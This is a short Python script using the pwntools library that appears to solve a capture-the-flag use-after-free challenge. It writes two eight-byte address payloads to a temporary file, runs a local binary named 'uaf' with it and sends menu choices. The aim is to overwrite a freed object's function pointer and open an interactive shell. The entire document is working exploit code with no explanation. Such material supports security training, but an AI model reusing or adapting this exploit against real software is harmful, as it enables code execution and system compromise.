from pwn import *
import time
filename = '/tmp/chashao'
payload1 = '\x68\x15\x40\x00\x00\x00\x00\x00'
fp = open(filename, 'w')
fp.write(payload1)
fp.close()
p = process(['./uaf', '8', filename])

p.sendline('3')
p.sendline('2')

print('next:' + p.read())
fp = open(filename, 'w')
paylaod2 = '\x48\x15\x40\x00\x00\x00\x00\x00'
fp.write(paylaod2)
fp.close()

p.sendline('2')
p.sendline('1')
p.interactive()